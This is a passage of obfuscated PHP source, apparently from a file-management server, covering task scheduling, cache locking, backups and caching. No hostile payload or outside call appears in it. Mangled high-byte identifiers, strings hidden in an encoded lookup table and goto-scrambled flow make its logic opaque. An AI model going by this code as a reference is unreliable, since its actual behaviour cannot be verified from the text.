sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $á“ÅÀ–ì =& $_SERVER[…É¦À–]; http_close(); self::valueSet($á“ÅÀ–ì[790], $á“ÅÀ–ì[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($á“ÅÀ–ì[1646] => $á“ÅÀ–ì[198], $á“ÅÀ–ì[790] => $á“ÅÀ–ì[88]), !1); } public static function taskSwitch() { $ğ¯ß¾ =& $_SERVER[…É¦À–]; $–µğ¿¯í = self::valueGet($ğ¯ß¾[790]) == $ğ¯ß¾[88] ? $ğ¯ß¾[198] : $ğ¯ß¾[88]; self::valueSet($ğ¯ß¾[790], $–µğ¿¯í); } public static function shutdownEvent() { $ˆÊ—„Ä› =& $_SERVER[…É¦À–]; self::valueSet($ˆÊ—„Ä›[1646], $ˆÊ—„Ä›[198]); self::log($ˆÊ—„Ä›[1655]); } public static function config($›Ïƒê´Ö, $¤¾…äÜ¡) { self::valueSet($_SERVER[…É¦À–][790], $›Ïƒê´Ö); } private static function taskRunAll() { $÷Ù“ì«Õ =& $_SERVER[…É¦À–]; $ğÒòıù¨ = timeFloat(); $¤ÚÒŠ–Ú = Model($÷Ù“ì«Õ[1656])->listData(); $¼…Ï¥šØ = count($¤ÚÒŠ–Ú); for ($È©±Šµû = 0; $È©±Šµû < $¼…Ï¥šØ; $È©±Šµû++) { $÷§Ì¨àê = $¤ÚÒŠ–Ú[$È©±Šµû]; if (!$÷§Ì¨àê[$÷Ù“ì«Õ[428]] || $÷§Ì¨àê[$÷Ù“ì«Õ[1657]] != $÷Ù“ì«Õ[88]) { continue; } if (!self::taskTimeCheck($÷§Ì¨àê)) { continue; } self::taskRun($÷§Ì¨àê); } Hook::trigger($÷Ù“ì«Õ[1658]); self::taskQueueRun($ğÒòıù¨); } private static function taskQueueRun($ “œŞ¾Ã) { $ß»´ŠÖú = 10; while (!0) { $‡»î€Ø = TaskQueue::run(); if ($‡»î€Ø === !1) { break; } if (timeFloat() - $ “œŞ¾Ã >= $ß»´ŠÖú) { break; } } } private static function taskTimeCheck($ìäÙó) { $çÕ€©© =& $_SERVER[…É¦À–]; $º„°òî = json_decode($ìäÙó[$çÕ€©©[180]], !0); $ñ—²âñİ = intval($ìäÙó[$çÕ€©©[1647]]); $Ø·ùíÆ€ = strtotime($çÕ€©©[1659] . $º„°òî[$çÕ€©©[1660]] . $çÕ€©©[1661]) - strtotime($çÕ€©©[1662]); $æâÚÈ¯Œ = time() - strtotime(date($çÕ€©©[1663]) . $çÕ€©©[1664]); $‹®ÛÉñ‚ = $æâÚÈ¯Œ >= $Ø·ùíÆ€ && $æâÚÈ¯Œ <= $Ø·ùíÆ€ + 3600; switch ($º„°òî[$çÕ€©©[33]]) { case $çÕ€©©[1665]: if (time() - $ñ—²âñİ < 3600 * 24 * 30) { return !1; } if ($º„°òî[$çÕ€©©[1665]] == date($çÕ€©©[1666]) && $‹®ÛÉñ‚) { return !0; } break; case $çÕ€©©[1667]: if (time() - $ñ—²âñİ < 3600 * 24 * 7) { return !1; } $à¢Á³æ = date($çÕ€©©[1668]) == 0 ? 7 : date($çÕ€©©[1668]); if ($º„°òî[$çÕ€©©[1667]] == $à¢Á³æ && $‹®ÛÉñ‚) { return !0; } break; case $çÕ€©©[1660]: if (time() - $ñ—²âñİ < 3600 * 24) { return !1; } if ($‹®ÛÉñ‚) { return !0; } break; case $çÕ€©©[1669]: if (time() - $ñ—²âñİ >= floatval($º„°òî[$çÕ€©©[1669]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $£ÉÆÖÀ =& $_SERVER[…É¦À–]; static $¦Ø·­è = 0; $‹Å„˜ÏË = 300; if (!$¦Ø·­è) { $¦Ø·­è = time(); } if (time() - $¦Ø·­è < $‹Å„˜ÏË) { return; } $¦Ø·­è = time(); $‚Öô×è = Model($£ÉÆÖÀ[533])->db($£ÉÆÖÀ[12]); if ($‚Öô×è) { $‚Öô×è->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($£ÉÆÖÀ[1670], $£ÉÆÖÀ[1671]); die; } } public static function taskRun($„‘Ö¯àä) { $İü¸œÓğ =& $_SERVER[…É¦À–]; self::log($İü¸œÓğ[1672] . $„‘Ö¯àä[$İü¸œÓğ[428]] . $İü¸œÓğ[1673] . $„‘Ö¯àä[$İü¸œÓğ[32]] . $İü¸œÓğ[1674] . $„‘Ö¯àä[$İü¸œÓğ[1675]]); Model($İü¸œÓğ[1656])->run($„‘Ö¯àä[$İü¸œÓğ[428]]); $Ç§ñ›ìÓ = timeFloat(); $¨®¿¾€¡ = $İü¸œÓğ[12]; switch ($„‘Ö¯àä[$İü¸œÓğ[33]]) { case $İü¸œÓğ[336]: $©´š¥´© = url_request($„‘Ö¯àä[$İü¸œÓğ[1675]], $İü¸œÓğ[230], !1, !1, !1, !1, 10); if ($©´š¥´©[$İü¸œÓğ[790]]) { $¨®¿¾€¡ = strlen($©´š¥´©[$İü¸œÓğ[1247]]); } break; case $İü¸œÓğ[229]: $¨®¿¾€¡ = Hook::apply($„‘Ö¯àä[$İü¸œÓğ[1675]]); default: break; } Model($İü¸œÓğ[1676])->add(array($İü¸œÓğ[1677] => $İü¸œÓğ[12], $İü¸œÓğ[1678] => $İü¸œÓğ[198], $İü¸œÓğ[33] => $İü¸œÓğ[1679] . $„‘Ö¯àä[$İü¸œÓğ[428]], $İü¸œÓğ[1680] => json_encode(array($İü¸œÓğ[32] => $„‘Ö¯àä[$İü¸œÓğ[32]], $İü¸œÓğ[1681] => timeFloat() - $Ç§ñ›ìÓ, $İü¸œÓğ[322] => $¨®¿¾€¡)))); $š©ãï­Ğ = $¨®¿¾€¡ ? $İü¸œÓğ[1682] . $¨®¿¾€¡ : $İü¸œÓğ[12]; self::log($İü¸œÓğ[1683] . $„‘Ö¯àä[$İü¸œÓğ[428]] . $İü¸œÓğ[164] . $š©ãï­Ğ); return !0; } private static function valueGet($·Şé„âĞ) { $ê•—±‡â =& $_SERVER[…É¦À–]; $·±§À¨ = $ê•—±‡â[1684]; $à“„¡­¡ = Model($ê•—±‡â[464])->get($·Şé„âĞ, $·±§À¨); if (is_null($à“„¡­¡)) { Model($ê•—±‡â[464])->set($ê•—±‡â[790], $ê•—±‡â[88], $·±§À¨); Model($ê•—±‡â[464])->set($ê•—±‡â[1646], $ê•—±‡â[198], $·±§À¨); $à“„¡­¡ = Model($ê•—±‡â[464])->get($·Şé„âĞ, $·±§À¨); } return $à“„¡­¡; } private static function valueSet($„ó×óÀ, $©Ã–İ¿) { $À•ÀÓö€ =& $_SERVER[…É¦À–]; $ã©ˆé›Î = $À•ÀÓö€[1685]; CacheLock::lock($ã©ˆé›Î); $êÉõÔÁò = Model($À•ÀÓö€[464])->set($„ó×óÀ, $©Ã–İ¿, $À•ÀÓö€[1684]); CacheLock::unlock($ã©ˆé›Î); return $êÉõÔÁò; } protected static function log($”ö£ æ‚) { write_log($”ö£ æ‚, $_SERVER[…É¦À–][1671]); } private static function cacheClear() { $×Ş¥˜ƒ‚ =& $_SERVER[…É¦À–]; Cache::clearMemory(Model($×Ş¥˜ƒ‚[464])->cacheKey($×Ş¥˜ƒ‚[1684])); Cache::clearMemory(Model($×Ş¥˜ƒ‚[464])->cacheKey($×Ş¥˜ƒ‚[1686])); Model($×Ş¥˜ƒ‚[1656])->cacheClear(); self::closeDatabase(); } } goto Cé­¼ÉÉäÄ; dØ¾§¥æÂ¿: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‡€¸«±ƒ =& $_SERVER[…É¦À–]; $’¢ØÊ¾ã = $GLOBALS[$‡€¸«±ƒ[6]][$‡€¸«±ƒ[378]]; self::$cachePath = $’¢ØÊ¾ã[$‡€¸«±ƒ[200]][$‡€¸«±ƒ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¸À¥ÊÊ, $ŠŒ˜Ëí¹ = 0) { $½³‚‚ñÍ =& $_SERVER[…É¦À–]; $ó˜ÙÄÎ‰ = microtime(!0); $¿¿“şÒŠ = $ó˜ÙÄÎ‰ + $ŠŒ˜Ëí¹ + 0.0001; $»‰óïªø = rtrim(self::$cachePath, $½³‚‚ñÍ[8]) . $½³‚‚ñÍ[903] . md5($¸À¥ÊÊ) . $½³‚‚ñÍ[900]; if (file_exists($»‰óïªø) && filemtime($»‰óïªø) && filemtime($»‰óïªø) < time() - 10) { @unlink($»‰óïªø); } do { if (file_exists($»‰óïªø)) { cacheLockWait(); continue; } $áÀô–à‹ = fopen($»‰óïªø, $½³‚‚ñÍ[904]); if (!$áÀô–à‹) { return !1; } $¯ø¿¿•ö = flock($áÀô–à‹, LOCK_EX | LOCK_NB); self::$caches[$¸À¥ÊÊ] = array($½³‚‚ñÍ[905] => $áÀô–à‹, $½³‚‚ñÍ[200] => $»‰óïªø); fwrite($áÀô–à‹, $¿¿“şÒŠ); clearstatcache(); if ($áÀô–à‹ && $¯ø¿¿•ö) { return !0; } cacheLockWait(); } while (microtime(!0) < $¿¿“şÒŠ); $this->unlock($¸À¥ÊÊ); return !1; } public function lockGet($¢ò°ˆ´) { $ŸğòÕ¸È =& $_SERVER[…É¦À–]; $¨ùãõø = rtrim(self::$cachePath, $ŸğòÕ¸È[8]) . $ŸğòÕ¸È[903] . md5($¢ò°ˆ´) . $ŸğòÕ¸È[900]; return file_exists($¨ùãõø); } public function unlock($Âîıê©˜) { $‹æÁÉ¦ =& $_SERVER[…É¦À–]; $ûÖñ¥¤ï = self::$caches[$Âîıê©˜]; if (!$ûÖñ¥¤ï) { return; } @flock($ûÖñ¥¤ï[$‹æÁÉ¦[905]], LOCK_UN); @fclose($ûÖñ¥¤ï[$‹æÁÉ¦[905]]); @unlink($ûÖñ¥¤ï[$‹æÁÉ¦[200]]); unset(self::$caches[$Âîıê©˜]); } } class CacheLockRedis { public function lock($ñî²²‘, $Ûˆ¾Ğ»Õ = 10) { $¤‹ŠŠ†“ = Cache::init(); $İÍìì– = microtime(!0) + $Ûˆ¾Ğ»Õ; while (microtime(!0) < $İÍìì–) { $¡©ıı® = $¤‹ŠŠ†“->get($ñî²²‘); if (!$¡©ıı®) { $—ñßÎŠè = $¤‹ŠŠ†“->setLock($ñî²²‘, $İÍìì–, $Ûˆ¾Ğ»Õ); if ($—ñßÎŠè) { return !0; } } else { if ($¡©ıı® < microtime(!0)) { $¤‹ŠŠ†“->set($ñî²²‘, $İÍìì–, $Ûˆ¾Ğ»Õ * 2); if ($¤‹ŠŠ†“->get($ñî²²‘) === $¡©ıı®) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ßêÇ±å²) { return Cache::init()->get($ßêÇ±å²); } public function unlock($ˆÌ ŒÅ) { return Cache::init()->remove($ˆÌ ŒÅ); } } class CacheLockMemcached { public function lock($¯¬¬•–è, $ç¯­ÎøÍ = 0) { $‘­÷µ• = Cache::init(); $×“Ôí¤ = microtime(!0) + $ç¯­ÎøÍ; while (microtime(!0) < $×“Ôí¤) { $¯³÷ˆƒ€ = $‘­÷µ•->get($¯¬¬•–è); if (!$¯³÷ˆƒ€ || $¯³÷ˆƒ€ < microtime(!0)) { $ö³­æ‡¼ = $‘­÷µ•->handle->add($¯¬¬•–è, $×“Ôí¤, $ç¯­ÎøÍ); if ($ö³­æ‡¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ôš³Úçé) { return Cache::init()->get($ôš³Úçé); } public function unlock($Å¸”€”) { return Cache::init()->remove($Å¸”€”); } } goto C¬ñ…èì«; b´å‡í˜½¬: class BackupDbFile { public function __construct() { } public function index() { $üÄèËßÖ =& $_SERVER[…É¦À–]; $ûàŠõÛõ = Backup::get(); $ë°­€ôË = $ûàŠõÛõ[$üÄèËßÖ[32]]; $ğÇ‘†æœ = $this->tmpFilesPath() . "\142\141\143\153\165\x70\137{$ë°­€ôË}\57"; $ªåªÎµ = $this->backupPath($ûàŠõÛõ); if (!($ªåªÎµ = IO::mkdir($ªåªÎµ))) { return !1; } $Ò´îÛÑ = IO::listPath($ğÇ‘†æœ); $¶ó Ş‹‹ = isset($Ò´îÛÑ[$üÄèËßÖ[83]]) ? $Ò´îÛÑ[$üÄèËßÖ[83]] : array(); $ö«Éğîû = array_sum(array_column($¶ó Ş‹‹, $üÄèËßÖ[76])); if (!$ö«Éğîû) { return !1; } $÷ÛÜõŞî = array($üÄèËßÖ[838] => $ö«Éğîû, $üÄèËßÖ[839] => time()); Backup::set($÷ÛÜõŞî); $­şµÓŸ = new TaskFileTransfer($üÄèËßÖ[840], $üÄèËßÖ[820], count($¶ó Ş‹‹), LNG($üÄèËßÖ[821]) . $üÄèËßÖ[415] . LNG($üÄèËßÖ[823]) . $üÄèËßÖ[841]); $­şµÓŸ->task[$üÄèËßÖ[803]] = $ö«Éğîû; foreach ($Ò´îÛÑ[$üÄèËßÖ[83]] as $úˆ¨”è) { $ÍÁ±®È¾ = IO::move($úˆ¨”è[$üÄèËßÖ[84]], $ªåªÎµ); if (!$ÍÁ±®È¾) { $­şµÓŸ->end(); $ÖñƒÁÛ = IO::getLastError($üÄèËßÖ[842] . $úˆ¨”è[$üÄèËßÖ[84]] . $üÄèËßÖ[843] . $ªåªÎµ . $üÄèËßÖ[164]); write_log($ÖñƒÁÛ, $üÄèËßÖ[820]); return !1; } } $ÀŸ™ùëÍ = new DbManage(); $¥îüò‚§ = $ÀŸ™ùëÍ->getSqlFile(); if (!$¥îüò‚§[$üÄèËßÖ[844]] || !$¥îüò‚§[$üÄèËßÖ[13]]) { return !1; } IO::move($¥îüò‚§[$üÄèËßÖ[844]], $ªåªÎµ); IO::move($¥îüò‚§[$üÄèËßÖ[13]], $ªåªÎµ); $­şµÓŸ->end(); $÷ÛÜõŞî = array($üÄèËßÖ[845] => $ö«Éğîû, $üÄèËßÖ[846] => time()); Backup::set($÷ÛÜõŞî); return !0; } private function backupPath($¾Óšİ’Á) { $›¦½íš  =& $_SERVER[…É¦À–]; $‰ÍæÔ¤ä = $¾Óšİ’Á[$›¦½íš [32]]; $üÖ Š‡ = Model($›¦½íš [810])->get($›¦½íš [811]); $«âî¬ñî = substr(md5($›¦½íš [812] . $üÖ Š‡ . $‰ÍæÔ¤ä), 0, 8); return "\x7b\x69\x6f\x3a{$¾Óšİ’Á[$›¦½íš [791]]}\x7d\x2f\144\x61\164\141\142\x61\x73\x65\x2f\x62\x61\x63\153\165\x70\x2f" . $‰ÍæÔ¤ä . $›¦½íš [11] . $«âî¬ñî; } private function tmpFilesPath() { $ü´Ô”˜™ =& $_SERVER[…É¦À–]; $ù»³úÍ¢ = TEMP_FILES; if ($GLOBALS[$ü´Ô”˜™[6]][$ü´Ô”˜™[89]][$ü´Ô”˜™[836]]) { $ù»³úÍ¢ = $GLOBALS[$ü´Ô”˜™[6]][$ü´Ô”˜™[89]][$ü´Ô”˜™[836]]; if (!mk_dir($ù»³úÍ¢) || !is_writable($ù»³úÍ¢) || !IO::mkfile($ù»³úÍ¢ . $ü´Ô”˜™[837])) { $ù»³úÍ¢ = TEMP_FILES; } } return $ù»³úÍ¢; } } class BackupFile { public function __construct() { } public function index() { $ˆ®¬¾õ = Backup::get(); $ñ¯éÜåÜ = $ˆ®¬¾õ[$_SERVER[…É¦À–][322]][$_SERVER[…É¦À–][200]][$_SERVER[…É¦À–][497]]; $“İï¢ş = array($_SERVER[…É¦À–][498] => array($_SERVER[…É¦À–][847], $ñ¯éÜåÜ), $_SERVER[…É¦À–][848] => array($_SERVER[…É¦À–][360], $ˆ®¬¾õ[$_SERVER[…É¦À–][791]])); $µÁºáÈ¡ = (int) Model($_SERVER[…É¦À–][829])->where($“İï¢ş)->count($_SERVER[…É¦À–][497]); $Ë—´áÅ‰ = (int) Model($_SERVER[…É¦À–][829])->where($“İï¢ş)->sum($_SERVER[…É¦À–][76]); $¬¸ÇĞ©ï = new TaskFileTransfer($_SERVER[…É¦À–][849], $_SERVER[…É¦À–][820], $µÁºáÈ¡, LNG($_SERVER[…É¦À–][821]) . $_SERVER[…É¦À–][822] . LNG($_SERVER[…É¦À–][850])); $¬¸ÇĞ©ï->task[$_SERVER[…É¦À–][803]] = $Ë—´áÅ‰; $–²ææ¬š = array($_SERVER[…É¦À–][851] => $µÁºáÈ¡, $_SERVER[…É¦À–][852] => $Ë—´áÅ‰, $_SERVER[…É¦À–][853] => time()); Backup::set($–²ææ¬š); $­Ûâò“û = !0; $ëĞÖ ã¡ = $this->storeIds(); $¤õ¹Æ›º = 1; $­‡–¢ÉÀ = 1000; $©çê¢Æç = $£éß¦ó = 0; $ª¡Ñ„ü˜ = array(); $Û±¯ÒÙÀ = $à­€š” = 0; do { $ïÀ¦Ì× = $_SERVER[…É¦À–][854]; $ÒĞÕÊÌ¯ = Model($_SERVER[…É¦À–][829])->where($“İï¢ş)->field($ïÀ¦Ì×)->order($_SERVER[…É¦À–][855])->selectPage($­‡–¢ÉÀ, $¤õ¹Æ›º); $ÆÏÚš˜› = !empty($ÒĞÕÊÌ¯[$_SERVER[…É¦À–][398]]) ? $ÒĞÕÊÌ¯[$_SERVER[…É¦À–][398]] : array(); foreach ($ÆÏÚš˜› as $±ïä¯‘¹) { if (!$this->_fileExist($±ïä¯‘¹, $ª¡Ñ„ü˜, $ëĞÖ ã¡)) { $µÁºáÈ¡ -= 1; $Ë—´áÅ‰ -= (int) $±ïä¯‘¹[$_SERVER[…É¦À–][76]]; write_log("\146\x69\x6c\145\x20\x6e\157\x74\40\145\170\x69\163\x74\x2e\146\151\154\x65\x49\104\x3a{$±ïä¯‘¹[$_SERVER[…É¦À–][497]]}\x2c\x20\160\x61\x74\150\72{$±ïä¯‘¹[$_SERVER[…É¦À–][84]]}", $_SERVER[…É¦À–][856]); continue; } $û²›•ì’ = $±ïä¯‘¹[$_SERVER[…É¦À–][84]]; $Âô©Øé® = "\x7b\x69\x6f\72{$ˆ®¬¾õ[$_SERVER[…É¦À–][791]]}\175" . substr($û²›•ì’, strlen("\x7b\151\157\x3a{$±ïä¯‘¹[$_SERVER[…É¦À–][857]]}\x7d")); if (IO::exist($Âô©Øé®)) { $¬¸ÇĞ©ï->updateFileEnd($±ïä¯‘¹[$_SERVER[…É¦À–][32]], $±ïä¯‘¹[$_SERVER[…É¦À–][76]]); } else { $Âô©Øé® = get_path_father($Âô©Øé®); IO::mkdir($Âô©Øé®); if (!IO::copy($û²›•ì’, $Âô©Øé®, $_SERVER[…É¦À–][858])) { write_log($_SERVER[…É¦À–][859] . $û²›•ì’ . $_SERVER[…É¦À–][843] . $Âô©Øé® . $_SERVER[…É¦À–][164], $_SERVER[…É¦À–][820]); $­Ûâò“û = !1; break; } } $ñ¯éÜåÜ = $±ïä¯‘¹[$_SERVER[…É¦À–][497]]; $£éß¦ó += 1; $©çê¢Æç += $±ïä¯‘¹[$_SERVER[…É¦À–][76]]; $à­€š” += 1; $Û±¯ÒÙÀ += $±ïä¯‘¹[$_SERVER[…É¦À–][76]]; if ($©çê¢Æç >= 1024 * 1024 * 100) { $–²ææ¬š = array($_SERVER[…É¦À–][860] => $ñ¯éÜåÜ, $_SERVER[…É¦À–][861] => $à­€š”, $_SERVER[…É¦À–][862] => $Û±¯ÒÙÀ); Backup::set($–²ææ¬š); $©çê¢Æç = $£éß¦ó = 0; } } $©ÄŒ’ëº = count($ÆÏÚš˜›); $¤õ¹Æ›º++; } while ($©ÄŒ’ëº == $­‡–¢ÉÀ); $¬¸ÇĞ©ï->end(); $–²ææ¬š = array($_SERVER[…É¦À–][863] => 1, $_SERVER[…É¦À–][801] => time(), $_SERVER[…É¦À–][815] => 1, $_SERVER[…É¦À–][860] => $ñ¯éÜåÜ, $_SERVER[…É¦À–][852] => $Ë—´áÅ‰, $_SERVER[…É¦À–][851] => $µÁºáÈ¡, $_SERVER[…É¦À–][864] => time()); if ($£éß¦ó) { $–²ææ¬š[$_SERVER[…É¦À–][861]] = $à­€š”; $–²ææ¬š[$_SERVER[…É¦À–][862]] = $Û±¯ÒÙÀ; } Backup::set($–²ææ¬š); $this->_fileFilter($ª¡Ñ„ü˜); return !0; } private function _fileExist($­áæÂÏ¤, &$¢úÍ³²å, $³ì¶„Î®) { $Û‹¸Ù§ğ =& $_SERVER[…É¦À–]; $†ºì­“õ = $­áæÂÏ¤[$Û‹¸Ù§ğ[84]]; if (in_array($­áæÂÏ¤[$Û‹¸Ù§ğ[497]], $¢úÍ³²å)) { return !1; } if (!in_array($­áæÂÏ¤[$Û‹¸Ù§ğ[857]], $³ì¶„Î®)) { return !1; } if (IO::exist($†ºì­“õ)) { return !0; } $À›ÖÈÎ‰ = get_path_father($†ºì­“õ); if (IO::exist($À›ÖÈÎ‰)) { $¢úÍ³²å[] = $­áæÂÏ¤[$Û‹¸Ù§ğ[497]]; return !1; } $ëİÀ°ÇŠ = array($Û‹¸Ù§ğ[857] => $­áæÂÏ¤[$Û‹¸Ù§ğ[857]], $Û‹¸Ù§ğ[84] => array($Û‹¸Ù§ğ[412], "{$À›ÖÈÎ‰}\x25")); $¹¤İÆÈä = Model($Û‹¸Ù§ğ[829])->where($ëİÀ°ÇŠ)->field($Û‹¸Ù§ğ[498])->select(); $¢úÍ³²å = array_merge($¢úÍ³²å, array_to_keyvalue($¹¤İÆÈä, $Û‹¸Ù§ğ[12], $Û‹¸Ù§ğ[497])); return !1; } private function _fileFilter($ºğ†È³¾) { $õˆƒ ¢™ =& $_SERVER[…É¦À–]; if (empty($ºğ†È³¾)) { return; } $ÄêºùŞ» = array($õˆƒ ¢™[497] => array($õˆƒ ¢™[7], array_unique($ºğ†È³¾))); $òÙ¯­àş = Model($õˆƒ ¢™[865])->where($ÄêºùŞ»)->field($õˆƒ ¢™[431])->select(); foreach ($òÙ¯­àş as $¸Ó…á²) { Model($õˆƒ ¢™[865])->remove($¸Ó…á²[$õˆƒ ¢™[431]], !1); } } private function storeIds() { $­òÔúŞÎ =& $_SERVER[…É¦À–]; $«Ñ´¸Ô = Model($­òÔúŞÎ[807])->listData(); $«¤í§â = array(); $ˆ³ãÚ‹õ = $GLOBALS[$­òÔúŞÎ[6]][$­òÔúŞÎ[89]][$­òÔúŞÎ[866]]; foreach ($«Ñ´¸Ô as $ÅÛæ¦ß) { $Ü°ÖÂÀæ = strtolower($ÅÛæ¦ß[$­òÔúŞÎ[95]]); if (!isset($ˆ³ãÚ‹õ[$Ü°ÖÂÀæ])) { continue; } $ÃÌ›á•Ó = $­òÔúŞÎ[74] . (isset($ˆ³ãÚ‹õ[$Ü°ÖÂÀæ]) ? $ˆ³ãÚ‹õ[$Ü°ÖÂÀæ] : ucfirst($Ü°ÖÂÀæ)); if (!class_exists($ÃÌ›á•Ó)) { continue; } $«¤í§â[] = $ÅÛæ¦ß[$­òÔúŞÎ[428]]; } return $«¤í§â; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $“úíá–‚ =& $_SERVER[…É¦À–]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ôšïçŞÀ = $GLOBALS[$“úíá–‚[6]][$“úíá–‚[378]]; $¨ñ´½á’ = $ôšïçŞÀ[$ôšïçŞÀ[$“úíá–‚[867]]]; $äùÃ·¡„ = $ôšïçŞÀ[$“úíá–‚[868]]; switch ($ôšïçŞÀ[$“úíá–‚[867]]) { case $“úíá–‚[21]: self::$handle = Model($“úíá–‚[869]); break; case $“úíá–‚[870]: self::$handle = new CacheRedis($¨ñ´½á’, $äùÃ·¡„); break; case $“úíá–‚[871]: self::$handle = new CacheMemcached($¨ñ´½á’, $äùÃ·¡„); break; case $“úíá–‚[200]: self::$handle = new CacheFile($¨ñ´½á’, $äùÃ·¡„); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ášúÂã) { if (is_array($ášúÂã) || is_object($ášúÂã)) { $ášúÂã = json_encode($ášúÂã); } $ášúÂã = rawurlencode($ášúÂã); return md5(KOD_SITE_ID . $_SERVER[…É¦À–][11] . $ášúÂã); } public static function get($´„­ı£ø, $Ê™ê‰Ø = false) { $Ã‰Ã¹ ³ = self::key($´„­ı£ø); if ($Ê™ê‰Ø) { return unserialize(self::init()->get($Ã‰Ã¹ ³)); } if (!isset(self::$memoryCache[$Ã‰Ã¹ ³])) { $ÂÁÊ´ßñ = self::init()->get($Ã‰Ã¹ ³); self::$memoryCache[$Ã‰Ã¹ ³] = unserialize($ÂÁÊ´ßñ); } return self::$memoryCache[$Ã‰Ã¹ ³]; } public static function set($¡äú×—ş, $¢…ºñÜ, $ß£ËÃ´œ = false) { $ë¶±£ÛÙ = self::key($¡äú×—ş); if (isset(self::$memoryCache[$ë¶±£ÛÙ]) && self::$memoryCache[$ë¶±£ÛÙ] === $¢…ºñÜ) { return !0; } if ($ß£ËÃ´œ === 0) { self::$memoryCache[$ë¶±£ÛÙ] = $¢…ºñÜ; return !0; } CacheLock::lock($¡äú×—ş); $åí˜òÅ± = self::init()->set($ë¶±£ÛÙ, serialize($¢…ºñÜ), $ß£ËÃ´œ); self::$memoryCache[$ë¶±£ÛÙ] = $¢…ºñÜ; CacheLock::unlock($¡äú×—ş); return $åí˜òÅ±; } public static function getCall($ÇçÏŒšÀ, $œÜêÈäĞ, $ÙœÏßÔÍ, $„Şº»÷Ü = array()) { $²öÍíë¨ =& $_SERVER[…É¦À–]; $”Ş“ˆ£Ö = self::get($ÇçÏŒšÀ); if ($”Ş“ˆ£Ö || $”Ş“ˆ£Ö === $²öÍíë¨[12]) { return $”Ş“ˆ£Ö; } $”Ş“ˆ£Ö = call_user_func_array($ÙœÏßÔÍ, $„Şº»÷Ü); $”Ş“ˆ£Ö = $”Ş“ˆ£Ö ? $”Ş“ˆ£Ö : $²öÍíë¨[12]; self::set($ÇçÏŒšÀ, $”Ş“ˆ£Ö, $œÜêÈäĞ); return $”Ş“ˆ£Ö; } public static function remove($¼°îğš–) { $£¬´–öø = self::key($¼°îğš–); unset(self::$memoryCache[$£¬´–öø]); self::clearTimeout(); CacheLock::lock($¼°îğš–); $ï˜¢¸‰ú = self::init()->remove($£¬´–öø); CacheLock::unlock($¼°îğš–); return $ï˜¢¸‰ú; } public static function removeMemory($ºÄ¼çÄÍ) { $¥„×ş¥· = self::key($ºÄ¼çÄÍ); unset(self::$memoryCache[$¥„×ş¥·]); } public static function clearMemory($ğõÒ™ï = false) { if ($ğõÒ™ï) { $ğõÒ™ï = self::key($ğõÒ™ï); unset(self::$memoryCache[$ğõÒ™ï]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[…É¦À–][872])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[…É¦À–][873])) { self::init()->clearTimeout(); } } } goto fèÜ—œğê‹; B‡†•âÅ‰÷: class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\x69\156\x64\x65\170"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($›¨—»íÀ) { $âóòÀ¹ =& $_SERVER[…É¦À–]; $¯´¹ÌÕ‹ =& $_SERVER[…Ğİ€¤†]; $çÀöä®ù = explode($¯´¹ÌÕ‹[0], trim($›¨—»íÀ, $¯´¹ÌÕ‹[0])); $¹ş¢ŒØ¸ = $âóòÀ¹[641]; if (strlen($¹ş¢ŒØ¸) < $âóòÀ¹[642]) { return; } $this->defaultModule = $çÀöä®ù[0] ? $çÀöä®ù[0] : $this->defaultModule; $this->defaultController = $çÀöä®ù[1] ? $çÀöä®ù[1] : $this->defaultController; $äèÁ†¼¯ = $âóòÀ¹[643]; if (!$äèÁ†¼¯) { die; } $this->defaultAction = $çÀöä®ù[2] ? $çÀöä®ù[2] : $this->defaultAction; $this->mdytb48a91de($¯´¹ÌÕ‹[1], array($this, $¯´¹ÌÕ‹[2])); } public function appRun($ƒöï‹àæ) { $£°…Ôä =& $_SERVER[…É¦À–]; $Ô‡—“Û— =& $_SERVER[…Ğİ€¤†]; $çÇ­»€ö = explode($Ô‡—“Û—[0], $ƒöï‹àæ); $€ˆ»˜é© = strtolower($çÇ­»€ö[0]); $Ğ¡—˜²Ã = $£°…Ôä[644]; while ($Ğ¡—˜²Ã < $£°…Ôä[636]) { if ($Ğ¡—˜²Ã >= 0) { break; } $Ğ¡—˜²Ã++; } $ÜË¬Áôğ = $Ô‡—“Û—[3]; if ($€ˆ»˜é© == $Ô‡—“Û—[4]) { $ÜË¬Áôğ = $Ô‡—“Û—[5]; $çÇ­»€ö[0] = $Ô‡—“Û—[6]; $çÇ­»€ö[1] = $çÇ­»€ö[1] . $Ô‡—“Û—[7]; $ƒöï‹àæ = join($Ô‡—“Û—[0], $çÇ­»€ö); $ƒöï‹àæ = trim($ƒöï‹àæ, $Ô‡—“Û—[0]); } call_user_func(array($Ô‡—“Û—[8], $Ô‡—“Û—[9]), $ÜË¬Áôğ . $Ô‡—“Û—[10], $ƒöï‹àæ); ActionCall($ƒöï‹àæ); $ÊÀÛ¡×ï = $£°…Ôä[645]; if (!$ÊÀÛ¡×ï) { return; } call_user_func(array($Ô‡—“Û—[8], $Ô‡—“Û—[9]), $ÜË¬Áôğ . $Ô‡—“Û—[11], $ƒöï‹àæ); } private function autorun() { $‚øó‚ß£ =& $_SERVER[…É¦À–]; $–¢°ÜŠ´ =& $_SERVER[…Ğİ€¤†]; global $config; $²Í¢ß„„ = $‚øó‚ß£[646]; while (strlen($²Í¢ß„„) < $‚øó‚ß£[647]) { if (!$²Í¢ß„„) { break; } $²Í¢ß„„++; } if (count($config[$–¢°ÜŠ´[12]]) == 0) { return; } foreach ($config[$–¢°ÜŠ´[12]] as $˜Â«†ËÑ => $×ÉÜù¥›) { $this->appRun($×ÉÜù¥›); } } private function qbez85fb841e() { 